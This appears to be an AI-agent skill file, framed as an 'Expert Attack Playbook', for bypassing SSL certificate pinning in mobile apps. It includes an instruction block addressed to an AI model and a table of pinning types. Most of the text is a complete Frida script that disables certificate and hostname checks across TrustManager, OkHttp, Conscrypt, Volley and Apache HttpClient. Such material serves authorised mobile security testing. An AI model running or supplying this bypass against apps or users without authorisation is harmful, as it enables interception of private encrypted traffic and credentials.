---
name: mobile-ssl-pinning-bypass
description: "Mobile SSL pinning bypass playbook. Signals: mobile, Android attacks, iOS attacks."
zh-signals: "Mobile SSL pinning bypass playbook 信号:移动端,android攻击,ios攻击。"
when-to-use: >-
  Mobile SSL pinning bypass playbook. Use when intercepting HTTPS traffic from mobile applications that implement certificate pinning, public key pinning, or SPKI hash pinning on Android and iOS, including React Native, Flutter, and Xamarin frameworks.
---

# SKILL: Mobile SSL Pinning Bypass — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert SSL pinning bypass techniques for mobile platforms. Covers Android and iOS bypass methods (Frida, Objection, Xposed, SSL Kill Switch), framework-specific bypasses (Flutter, React Native, Xamarin), and troubleshooting non-standard pinning implementations. Base models miss framework-specific hook points and multi-layer pinning configurations.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [android-pentesting-tricks](../android-pentesting-tricks/SKILL.md) for broader Android testing beyond SSL bypass
- [ios-pentesting-tricks](../ios-pentesting-tricks/SKILL.md) for broader iOS testing beyond SSL bypass
- [api-sec](../api-sec/SKILL.md) once traffic is intercepted for API-level testing

---

## 1. SSL PINNING TYPES

| Pinning Type | What Is Pinned | Resilience | Common In |
|---|---|---|---|
| Certificate pinning | Exact leaf certificate (DER/PEM) | Low (breaks on cert rotation) | Legacy apps |
| Public key pinning | Subject Public Key Info | Medium (survives cert renewal if key unchanged) | Modern apps |
| SPKI hash pinning | SHA-256 of SPKI | Medium (same as public key) | OkHttp, AFNetworking |
| CA pinning | Intermediate or root CA cert | High (any cert from that CA works) | Enterprise apps |
| Multi-pin (backup pins) | Primary + backup pins | High (fallback pins) | HPKP-aware apps |

### How Pinning Works

```
TLS Handshake
│
├── Server presents certificate chain
│
├── Standard validation (system trust store)
│   └── Passes? continue : connection fails
│
└── Pin validation (app-level check)
    ├── Extract server cert/pubkey/SPKI hash
    ├── Compare against embedded pins
    └── Match found? → allow : → reject connection
```

---

## 2. ANDROID BYPASS METHODS

### 2.1 Frida Universal SSL Bypass

```javascript
// Hooks TrustManager, OkHttp, Volley, Retrofit, Conscrypt
Java.perform(function() {

    // ── TrustManagerImpl (Android system) ──
    try {
        var TMI = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TMI.verifyChain.implementation = function() {
            console.log('[Bypass] TrustManagerImpl.verifyChain');
            return arguments[0]; // return untouched chain
        };
    } catch(e) {}

    // ── X509TrustManager (custom implementations) ──
    var TrustManager = Java.registerClass({
        name: 'com.bypass.TrustManager',
        implements: [Java.use('javax.net.ssl.X509TrustManager')],
        methods: {
            checkClientTrusted: function() {},
            checkServerTrusted: function() {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;',
        '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom')
        .implementation = function(km, tm, sr) {
        console.log('[Bypass] SSLContext.init');
        this.init(km, [TrustManager.$new()], sr);
    };

    // ── OkHttp3 CertificatePinner ──
    try {
        var CP = Java.use('okhttp3.CertificatePinner');
        CP.check.overload('java.lang.String', 'java.util.List').implementation = function() {
            console.log('[Bypass] OkHttp3 CertificatePinner.check: ' + arguments[0]);
        };
        // check$okhttp variant (OkHttp 4.x)
        try { CP['check$okhttp'].implementation = function() {}; } catch(e) {}
    } catch(e) {}

    // ── Retrofit / OkHttp interceptor ──
    try {
        var OkHttpClient = Java.use('okhttp3.OkHttpClient$Builder');
        OkHttpClient.certificatePinner.implementation = function(pinner) {
            console.log('[Bypass] OkHttpClient.Builder.certificatePinner');
            return this; // return builder without pinner
        };
    } catch(e) {}

    // ── Volley (HurlStack) ──
    try {
        var HurlStack = Java.use('com.android.volley.toolbox.HurlStack');
        HurlStack.createConnection.implementation = function(url) {
            console.log('[Bypass] Volley HurlStack: ' + url);
            var conn = this.createConnection(url);
            // Remove hostname verifier
            conn.setHostnameVerifier(Java.use(
                'javax.net.ssl.HttpsURLConnection').getDefaultHostnameVerifier());
            return conn;
        };
    } catch(e) {}

    // ── Conscrypt / BoringSSL (modern Android) ──
    try {
        var Conscrypt = Java.use('org.conscrypt.ConscryptFileDescriptorSocket');
        Conscrypt.verifyCertificateChain.implementation = function() {
            console.log('[Bypass] Conscrypt verifyCertificateChain');
        };
    } catch(e) {}

    // ── Apache HttpClient (legacy) ──
    try {
        var AbstractVerifier = Java.use('org.apache.http.conn.ssl.AbstractVerifier');
        AbstractVerifier.verify.overload('java.lang.String', '[Ljava.lang.String;',
            '[Ljava.lang.String;', 'boolean').implementation = function() {
            console.log('[Bypass] Apache AbstractVerifier');
        };
    } catch(e) {}

    // ── HostnameVerifier ──
    try {
        var HV = Java.use('javax.net.ssl.HttpsURLConnection');
        HV.setDefaultHostnameVerifier.implementation = function(v) {
            console.log('[Bypass] Ignoring custom HostnameVerifier');
        };
    } catch(e) {}

    console.log('[+] Android universal SSL bypass loaded');
});
```

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
